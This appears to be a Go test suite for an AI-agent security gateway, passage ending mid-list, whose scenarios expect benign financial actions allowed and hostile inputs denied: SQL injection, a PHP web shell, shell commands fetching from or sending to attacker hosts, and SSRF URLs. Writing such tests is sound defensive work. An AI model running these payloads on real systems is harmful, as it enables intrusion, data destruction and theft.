package main

import (
	"bytes"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"sort"
	"strings"
	"testing"
	"time"

	"github.com/casbin/casbin/v2"
)

// CenturyScenario represents a single high-fidelity enterprise test case
type CenturyScenario struct {
	ID                 string
	Category           string
	Description        string
	AgentID            string
	Action             string
	Payload            map[string]interface{}
	RawJSONOverride    string // For HPP and syntax testing
	AuthOverride       string // "FORGED_SIG", "STALE_TS", "FUTURE_TS", "SHORT_NONCE", "REPLAY", "PIPE_AGENT", "PIPE_NONCE", "TAMPER_BODY", "MISSING_HEADER", "UNAUTHENTICATED"
	BurstReps          int    // For AML burst testing
	ExpectedStatus     int    // Expected HTTP status code (200, 400, 401, 403, 429)
	ExpectedDecision   string // "ALLOW" or "DENY"
	ExpectedReasonPart string // Substring expected in error/message
}

func TestCenturyBenchmark(t *testing.T) {
	fmt.Println("\n========================================================================")
	fmt.Println("       SENTINEL CENTURY BENCHMARK SUITE: 100+ ENTERPRISE SCENARIOS      ")
	fmt.Println("========================================================================")
	fmt.Println("Auditing 110 Real-World Tier-1 Enterprise & Adversarial Vectors...")

	// Mock Case Law engine returning ALLOW for non-guardrail calls
	mockEngine := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]string{
			"decision": "ALLOW",
			"status":   "ALLOW",
			"reason":   "Mock engine pass",
		})
	}))
	defer mockEngine.Close()

	t.Setenv("SENTINEL_CASE_LAW_URL", mockEngine.URL)
	agentSharedSecret = "sentinel_test_secret_for_reality_check_32bytes"

	var casbinErr error
	enforcer, casbinErr = casbin.NewEnforcer("../casbin_policies/model.conf", "../casbin_policies/policy.csv")
	if casbinErr != nil {
		t.Fatalf("Failed to initialize Casbin Enforcer: %v", casbinErr)
	}

	scenarios := []CenturyScenario{
		// ---------------------------------------------------------------------
		// CATEGORY 1: Benign Multi-Agent Workloads (15 Scenarios) -> MUST ALLOW
		// ---------------------------------------------------------------------
		{
			ID: "BENIGN-01", Category: "Benign Workloads", Description: "Standard travel refund ($45.00)",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": 45.0, "reason": "Baggage delay fee"},
			ExpectedStatus: http.StatusOK, ExpectedDecision: "ALLOW",
		},
		{
			ID: "BENIGN-02", Category: "Benign Workloads", Description: "Executive flight booking transfer ($2,500.00)",
			AgentID: "ag_Travel_Bot", Action: "TRANSFER",
			Payload: map[string]interface{}{"amount": 2500.0, "recipient": "hotel_partner_88"},
			ExpectedStatus: http.StatusOK, ExpectedDecision: "ALLOW",
		},
		{
			ID: "BENIGN-03", Category: "Benign Workloads", Description: "Conference travel expense refund ($3,450.00)",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": 3450.0, "notes": "Annual engineering summit flights"},
			ExpectedStatus: http.StatusOK, ExpectedDecision: "ALLOW",
		},
		{
			ID: "BENIGN-04", Category: "Benign Workloads", Description: "Customer dispute containing SQL words in natural prose",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": 85.0, "notes": "Customer requested to drop bags at reception table and update flight booking details"},
			ExpectedStatus: http.StatusOK, ExpectedDecision: "ALLOW",
		},
		{
			ID: "BENIGN-05", Category: "Benign Workloads", Description: "Formatted currency string with comma and dollar sign ($1,250.00)",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": "$1,250.00", "notes": "Approved cancellation"},
			ExpectedStatus: http.StatusOK, ExpectedDecision: "ALLOW",
		},
		{
			ID: "BENIGN-06", Category: "Benign Workloads", Description: "Minor units integer cents payload (150,000 cents = $1,500.00)",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount_in_cents": 150000, "notes": "Stripe-style minor units"},
			ExpectedStatus: http.StatusOK, ExpectedDecision: "ALLOW",
		},
		{
			ID: "BENIGN-07", Category: "Benign Workloads", Description: "Legitimate Euro refund (850 EUR ≈ $918 USD)",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": 850.0, "currency": "EUR"},
			ExpectedStatus: http.StatusOK, ExpectedDecision: "ALLOW",
		},
		{
			ID: "BENIGN-08", Category: "Benign Workloads", Description: "British Pound hotel cancellation (420 GBP ≈ $537 USD)",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": 420.0, "currency": "GBP"},
			ExpectedStatus: http.StatusOK, ExpectedDecision: "ALLOW",
		},
		{
			ID: "BENIGN-09", Category: "Benign Workloads", Description: "Japanese Yen transit transfer (15,000 JPY ≈ $97.50 USD)",
			AgentID: "ag_Travel_Bot", Action: "TRANSFER",
			Payload: map[string]interface{}{"amount": 15000.0, "currency": "JPY"},
			ExpectedStatus: http.StatusOK, ExpectedDecision: "ALLOW",
		},
		{
			ID: "BENIGN-10", Category: "Benign Workloads", Description: "Canadian Dollar baggage refund (75 CAD ≈ $54.75 USD)",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": 75.0, "currency": "CAD"},
			ExpectedStatus: http.StatusOK, ExpectedDecision: "ALLOW",
		},
		{
			ID: "BENIGN-11", Category: "Benign Workloads", Description: "Legitimate read-only SQL query on unreserved application table",
			AgentID: "ag_Dispute_AI", Action: "TRANSFER",
			Payload: map[string]interface{}{"query": "SELECT flight_id, status FROM flight_logs WHERE status = 'delayed' LIMIT 10"},
			ExpectedStatus: http.StatusOK, ExpectedDecision: "ALLOW",
		},
		{
			ID: "BENIGN-12", Category: "Benign Workloads", Description: "Deeply structured valid itinerary object (5 levels nested)",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{
				"amount": 120.0,
				"itinerary": map[string]interface{}{
					"flight": map[string]interface{}{
						"leg1": map[string]interface{}{
							"carrier": "UA",
							"details": map[string]interface{}{
								"seats": []interface{}{"12A", "12B"},
							},
						},
					},
				},
			},
			ExpectedStatus: http.StatusOK, ExpectedDecision: "ALLOW",
		},
		{
			ID: "BENIGN-13", Category: "Benign Workloads", Description: "Fraud Bot emergency card freeze (authorized action)",
			AgentID: "ag_Fraud_Bot", Action: "Lock_Card",
			Payload: map[string]interface{}{"card_id": "card_corp_9988", "reason": "Suspicious login from unknown ASN"},
			ExpectedStatus: http.StatusOK, ExpectedDecision: "ALLOW",
		},
		{
			ID: "BENIGN-14", Category: "Benign Workloads", Description: "Dispute AI authorized credit limit increase ($15,000.00)",
			AgentID: "ag_Dispute_AI", Action: "Credit_Increase",
			Payload: map[string]interface{}{"amount": 15000.0, "customer_id": "cust_vip_44"},
			ExpectedStatus: http.StatusOK, ExpectedDecision: "ALLOW",
		},
		{
			ID: "BENIGN-15", Category: "Benign Workloads", Description: "Group travel multi-passenger refund ($450.00)",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": 450.0, "recipients": []interface{}{"user_1", "user_2", "user_3"}},
			ExpectedStatus: http.StatusOK, ExpectedDecision: "ALLOW",
		},

		// ---------------------------------------------------------------------
		// CATEGORY 2: Financial Precision & Salami Slicing (10 Scenarios)
		// ---------------------------------------------------------------------
		{
			ID: "FIN-01", Category: "Financial Precision", Description: "IEEE 754 NaN string injection",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": "NaN"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "FIN-02", Category: "Financial Precision", Description: "IEEE 754 Positive Infinity string injection",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": "Infinity"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "FIN-03", Category: "Financial Precision", Description: "Negative refund amount to siphon funds (-$250.00)",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": -250.0},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "FIN-04", Category: "Financial Precision", Description: "Negative funds transfer to reverse settlement (-$5,000.00)",
			AgentID: "ag_Travel_Bot", Action: "TRANSFER",
			Payload: map[string]interface{}{"amount": -5000.0},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "FIN-05", Category: "Financial Precision", Description: "Sub-cent fractional penny salami slicing ($9,999.999999999999)",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": 9999.999999999999},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "FIN-06", Category: "Financial Precision", Description: "Micro-cent precision accumulation attack ($10.005)",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": 10.005},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "FIN-07", Category: "Financial Precision", Description: "Scientific notation ceiling escape (1e6 = $1,000,000.00)",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": "1e6"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "FIN-08", Category: "Financial Precision", Description: "Scientific notation fractional sub-cent evasion (1e-5)",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": "1e-5"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "FIN-09", Category: "Financial Precision", Description: "Japanese Yen sub-unit fractional precision (100.5 JPY prohibited)",
			AgentID: "ag_Travel_Bot", Action: "TRANSFER",
			Payload: map[string]interface{}{"amount": 100.5, "currency": "JPY"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "FIN-10", Category: "Financial Precision", Description: "Arbitrary alphabetic string in numeric amount",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": "ten_thousand_dollars"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},

		// ---------------------------------------------------------------------
		// CATEGORY 3: Multi-Currency & FX Arbitrage Evasions (10 Scenarios)
		// ---------------------------------------------------------------------
		{
			ID: "FX-01", Category: "Multi-Currency FX", Description: "Kuwaiti Dinar arbitrage (9,500 KWD ≈ $30,970 USD > $10k refund ceiling)",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": 9500.0, "currency": "KWD"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "FX-02", Category: "Multi-Currency FX", Description: "Bitcoin crypto threshold evasion (5.0 BTC ≈ $325,000 USD > $10k ceiling)",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": 5.0, "currency": "BTC"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "FX-03", Category: "Multi-Currency FX", Description: "Ethereum crypto threshold evasion (10.0 ETH ≈ $35,000 USD > $10k ceiling)",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": 10.0, "currency": "ETH"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "FX-04", Category: "Multi-Currency FX", Description: "British Pound threshold evasion (8,500 GBP ≈ $10,880 USD > $10k ceiling)",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": 8500.0, "currency": "GBP"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "FX-05", Category: "Multi-Currency FX", Description: "Euro threshold evasion (9,800 EUR ≈ $10,584 USD > $10k ceiling)",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": 9800.0, "currency": "EUR"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "FX-06", Category: "Multi-Currency FX", Description: "KWD transfer ceiling evasion (8,000 KWD ≈ $26,080 USD > $25k transfer ceiling)",
			AgentID: "ag_Travel_Bot", Action: "TRANSFER",
			Payload: map[string]interface{}{"amount": 8000.0, "currency": "KWD"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "FX-07", Category: "Multi-Currency FX", Description: "Bitcoin credit increase evasion (1.0 BTC ≈ $65,000 USD > $50k credit ceiling)",
			AgentID: "ag_Dispute_AI", Action: "Credit_Increase",
			Payload: map[string]interface{}{"amount": 1.0, "currency": "BTC"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "FX-08", Category: "Multi-Currency FX", Description: "Lowercase currency code evasion (9,500 kwd > ceiling)",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": 9500.0, "currency": "kwd"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "FX-09", Category: "Multi-Currency FX", Description: "Whitespace padded currency code evasion (  EUR  )",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": 9800.0, "currency": "  EUR  "},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "FX-10", Category: "Multi-Currency FX", Description: "Alternative currency alias (curr: 'GBP')",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": 8500.0, "curr": "GBP"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},

		// ---------------------------------------------------------------------
		// CATEGORY 4: Destructive SQL DDL, DCL & Mutation Injections (12 Scenarios)
		// ---------------------------------------------------------------------
		{
			ID: "SQL-01", Category: "Destructive SQL DDL/DCL", Description: "Classic stacked DROP TABLE injection",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": 100.0, "query": "SELECT * FROM users; DROP TABLE accounts;--"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "SQL-02", Category: "Destructive SQL DDL/DCL", Description: "Inline SQL comment obfuscation (DROP/**/TABLE)",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": 100.0, "notes": "DROP/**/TABLE/**/customers;"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "SQL-03", Category: "Destructive SQL DDL/DCL", Description: "Multiline SQL comment obfuscation (DROP/* test */TABLE)",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": 100.0, "notes": "DROP/* arbitrary commentary */TABLE users;"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "SQL-04", Category: "Destructive SQL DDL/DCL", Description: "TRUNCATE TABLE statement injection",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": 50.0, "sql": "TRUNCATE transactions;"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "SQL-05", Category: "Destructive SQL DDL/DCL", Description: "Unbounded DELETE FROM statement",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": 50.0, "query": "DELETE FROM users;"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "SQL-06", Category: "Destructive SQL DDL/DCL", Description: "Unbounded DELETE with 1=1 tautology",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": 50.0, "query": "DELETE FROM users WHERE 1=1;"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "SQL-07", Category: "Destructive SQL DDL/DCL", Description: "Privilege escalation attack (GRANT ALL PRIVILEGES)",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": 50.0, "sql": "GRANT ALL PRIVILEGES ON *.* TO 'bot'@'%';"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "SQL-08", Category: "Destructive SQL DDL/DCL", Description: "Privilege revocation attack (REVOKE ALL PRIVILEGES)",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": 50.0, "sql": "REVOKE ALL PRIVILEGES ON *.* FROM 'admin';"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "SQL-09", Category: "Destructive SQL DDL/DCL", Description: "DROP SCHEMA cascade destruction",
			AgentID: "ag_Travel_Bot", Action: "TRANSFER",
			Payload: map[string]interface{}{"query": "DROP SCHEMA public CASCADE;"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "SQL-10", Category: "Destructive SQL DDL/DCL", Description: "DROP DATABASE destruction",
			AgentID: "ag_Travel_Bot", Action: "TRANSFER",
			Payload: map[string]interface{}{"query": "DROP DATABASE production;"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "SQL-11", Category: "Destructive SQL DDL/DCL", Description: "ALTER TABLE column drop attack",
			AgentID: "ag_Travel_Bot", Action: "TRANSFER",
			Payload: map[string]interface{}{"query": "ALTER TABLE users DROP COLUMN password_hash;"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "SQL-12", Category: "Destructive SQL DDL/DCL", Description: "Full-width Unicode homoglyph DDL (ＤＲＯＰ ＴＡＢＬＥ)",
			AgentID: "ag_Travel_Bot", Action: "TRANSFER",
			Payload: map[string]interface{}{"query": "ＤＲＯＰ ＴＡＢＬＥ accounts;"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},

		// ---------------------------------------------------------------------
		// CATEGORY 5: SQL Exfiltration, Blind & Obfuscation Evasions (10 Scenarios)
		// ---------------------------------------------------------------------
		{
			ID: "SQLEX-01", Category: "SQL Exfiltration & Blind", Description: "Credential exfiltration via UNION SELECT",
			AgentID: "ag_Travel_Bot", Action: "TRANSFER",
			Payload: map[string]interface{}{"query": "UNION SELECT username, password_hash FROM passwords"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "SQLEX-02", Category: "SQL Exfiltration & Blind", Description: "Credit card exfiltration via UNION ALL SELECT",
			AgentID: "ag_Travel_Bot", Action: "TRANSFER",
			Payload: map[string]interface{}{"query": "UNION ALL SELECT card_number, cvv FROM vault_cards"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "SQLEX-03", Category: "SQL Exfiltration & Blind", Description: "Unauthorized balance mutation (UPDATE accounts SET)",
			AgentID: "ag_Travel_Bot", Action: "TRANSFER",
			Payload: map[string]interface{}{"query": "UPDATE accounts SET balance = 999999 WHERE id = 1"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "SQLEX-04", Category: "SQL Exfiltration & Blind", Description: "Unauthorized admin insertion (INSERT INTO users)",
			AgentID: "ag_Travel_Bot", Action: "TRANSFER",
			Payload: map[string]interface{}{"query": "INSERT INTO users (username, role) VALUES ('backdoor', 'superadmin')"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "SQLEX-05", Category: "SQL Exfiltration & Blind", Description: "Full-width Unicode UPDATE injection (ＵＰＤＡＴＥ)",
			AgentID: "ag_Travel_Bot", Action: "TRANSFER",
			Payload: map[string]interface{}{"query": "ＵＰＤＡＴＥ accounts ＳＥＴ balance = 999999 WHERE id = 1"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "SQLEX-06", Category: "SQL Exfiltration & Blind", Description: "Zero-width space keyword splitting (U\\u200BPDATE)",
			AgentID: "ag_Travel_Bot", Action: "TRANSFER",
			Payload: map[string]interface{}{"query": "U\u200BPDATE accounts SET balance = 999999 WHERE id = 1"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "SQLEX-07", Category: "SQL Exfiltration & Blind", Description: "Zero-width non-joiner keyword splitting (D\\u200CROP)",
			AgentID: "ag_Travel_Bot", Action: "TRANSFER",
			Payload: map[string]interface{}{"query": "D\u200CRO\u200CP TABLE audit_logs;"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "SQLEX-08", Category: "SQL Exfiltration & Blind", Description: "Time-based blind SQL injection (pg_sleep)",
			AgentID: "ag_Travel_Bot", Action: "TRANSFER",
			Payload: map[string]interface{}{"query": "SELECT * FROM flights WHERE id = 1 AND pg_sleep(10);"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "SQLEX-09", Category: "SQL Exfiltration & Blind", Description: "Out-of-band file read injection (LOAD_FILE)",
			AgentID: "ag_Travel_Bot", Action: "TRANSFER",
			Payload: map[string]interface{}{"query": "SELECT LOAD_FILE('/etc/passwd')"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "SQLEX-10", Category: "SQL Exfiltration & Blind", Description: "File write backdoor injection (INTO OUTFILE)",
			AgentID: "ag_Travel_Bot", Action: "TRANSFER",
			Payload: map[string]interface{}{"query": "SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/shell.php'"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},

		// ---------------------------------------------------------------------
		// CATEGORY 6: Arbitrary Command & Remote Code Execution (12 Scenarios)
		// ---------------------------------------------------------------------
		{
			ID: "CMD-01", Category: "Command Injection", Description: "Semicolon command chaining with rm -rf",
			AgentID: "ag_Dispute_AI", Action: "EXEC_TOOL",
			Payload: map[string]interface{}{"cmd": "test; rm -rf /"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "CMD-02", Category: "Command Injection", Description: "Logical AND command chaining with reverse shell",
			AgentID: "ag_Dispute_AI", Action: "EXEC_TOOL",
			Payload: map[string]interface{}{"command": "status && python3 -c 'import socket...'"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "CMD-03", Category: "Command Injection", Description: "Logical OR command chaining with netcat exfiltration",
			AgentID: "ag_Dispute_AI", Action: "EXEC_TOOL",
			Payload: map[string]interface{}{"script": "ping 8.8.8.8 || nc -l 4444"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "CMD-04", Category: "Command Injection", Description: "Pipe command chaining with remote payload download",
			AgentID: "ag_Dispute_AI", Action: "EXEC_TOOL",
			Payload: map[string]interface{}{"cmd": "echo test | wget https://attacker.com/payload.sh"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "CMD-05", Category: "Command Injection", Description: "Subshell execution syntax in command $(rm -rf)",
			AgentID: "ag_Dispute_AI", Action: "EXEC_TOOL",
			Payload: map[string]interface{}{"cmd": "process $(rm -rf /tmp/data)"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "CMD-06", Category: "Command Injection", Description: "Backtick execution syntax in command `cat /etc/passwd`",
			AgentID: "ag_Dispute_AI", Action: "EXEC_TOOL",
			Payload: map[string]interface{}{"cmd": "lookup `cat /etc/passwd`"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "CMD-07", Category: "Command Injection", Description: "Unmonitored parameter key command chaining (target_account: '123; curl ...')",
			AgentID: "ag_Travel_Bot", Action: "TRANSFER",
			Payload: map[string]interface{}{"amount": 100.0, "target_account": "acc_99; curl https://attacker-c2.com/steal"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "CMD-08", Category: "Command Injection", Description: "Bash -c subshell execution in tool args",
			AgentID: "ag_Dispute_AI", Action: "EXEC_TOOL",
			Payload: map[string]interface{}{"args": "check; bash -c 'rm -rf *'"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "CMD-09", Category: "Command Injection", Description: "Chained file permission tampering (chmod 777)",
			AgentID: "ag_Dispute_AI", Action: "EXEC_TOOL",
			Payload: map[string]interface{}{"cmd": "id; chmod 777 /etc/shadow"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "CMD-10", Category: "Command Injection", Description: "Base64 piped execution (base64 -d)",
			AgentID: "ag_Dispute_AI", Action: "EXEC_TOOL",
			Payload: map[string]interface{}{"cmd": "echo dGVzdA== | base64 -d | sh"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "CMD-11", Category: "Command Injection", Description: "Chained process termination (kill -9 1)",
			AgentID: "ag_Dispute_AI", Action: "EXEC_TOOL",
			Payload: map[string]interface{}{"cmd": "stop; kill -9 1"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "CMD-12", Category: "Command Injection", Description: "Full-width Unicode shell command chaining (； ｒｍ -rf)",
			AgentID: "ag_Travel_Bot", Action: "TRANSFER",
			Payload: map[string]interface{}{"note": "test； ｒｍ -rf /"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},

		// ---------------------------------------------------------------------
		// CATEGORY 7: SSRF, Cloud Metadata & IP Encoding Evasions (15 Scenarios)
		// ---------------------------------------------------------------------
		{
			ID: "SSRF-01", Category: "SSRF & Metadata Protection", Description: "AWS EC2 IMDSv1 metadata literal IP (169.254.169.254)",
			AgentID: "ag_Travel_Bot", Action: "TRANSFER",
			Payload: map[string]interface{}{"webhook": "http://169.254.169.254/latest/meta-data/"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "SSRF-02", Category: "SSRF & Metadata Protection", Description: "AWS EC2 IMDSv2 token acquisition endpoint",
			AgentID: "ag_Travel_Bot", Action: "TRANSFER",
			Payload: map[string]interface{}{"webhook": "http://169.254.169.254/latest/api/token"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "SSRF-03", Category: "SSRF & Metadata Protection", Description: "GCP internal metadata hostname (metadata.google.internal)",
			AgentID: "ag_Travel_Bot", Action: "TRANSFER",
			Payload: map[string]interface{}{"webhook": "http://metadata.google.internal/computeMetadata/v1/"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "SSRF-04", Category: "SSRF & Metadata Protection", Description: "Loopback IPv4 daemon probing (127.0.0.1:8080)",
			AgentID: "ag_Travel_Bot", Action: "TRANSFER",
			Payload: map[string]interface{}{"callback": "http://127.0.0.1:8080/admin"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "SSRF-05", Category: "SSRF & Metadata Protection", Description: "Localhost hostname probing (localhost:3000)",
			AgentID: "ag_Travel_Bot", Action: "TRANSFER",
			Payload: map[string]interface{}{"callback": "http://localhost:3000/internal"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "SSRF-06", Category: "SSRF & Metadata Protection", Description: "RFC 1918 Class A private subnet (10.0.0.1/secrets)",
			AgentID: "ag_Travel_Bot", Action: "TRANSFER",
			Payload: map[string]interface{}{"url": "http://10.0.0.1/secrets"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "SSRF-07", Category: "SSRF & Metadata Protection", Description: "RFC 1918 Class B private subnet (172.16.0.5/api)",
			AgentID: "ag_Travel_Bot", Action: "TRANSFER",
			Payload: map[string]interface{}{"url": "http://172.16.0.5/api"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "SSRF-08", Category: "SSRF & Metadata Protection", Description: "RFC 1918 Class C private subnet (192.168.1.1/router)",
			AgentID: "ag_Travel_Bot", Action: "TRANSFER",
			Payload: map[string]interface{}{"url": "http://192.168.1.1/router"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "SSRF-09", Category: "SSRF & Metadata Protection", Description: "Decimal integer loopback IP encoding (2130706433 -> 127.0.0.1)",
			AgentID: "ag_Travel_Bot", Action: "TRANSFER",
			Payload: map[string]interface{}{"webhook": "http://2130706433/admin"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "SSRF-10", Category: "SSRF & Metadata Protection", Description: "Decimal integer AWS metadata IP encoding (2852039166 -> 169.254.169.254)",
			AgentID: "ag_Travel_Bot", Action: "TRANSFER",
			Payload: map[string]interface{}{"webhook": "http://2852039166/latest/meta-data/"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "SSRF-11", Category: "SSRF & Metadata Protection", Description: "Domain-cloaked DNS rebinding pattern (rebind.attacker-infra.internal)",
			AgentID: "ag_Travel_Bot", Action: "TRANSFER",
			Payload: map[string]interface{}{"webhook": "http://rebind.attacker-infra.internal/latest/meta-data/"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
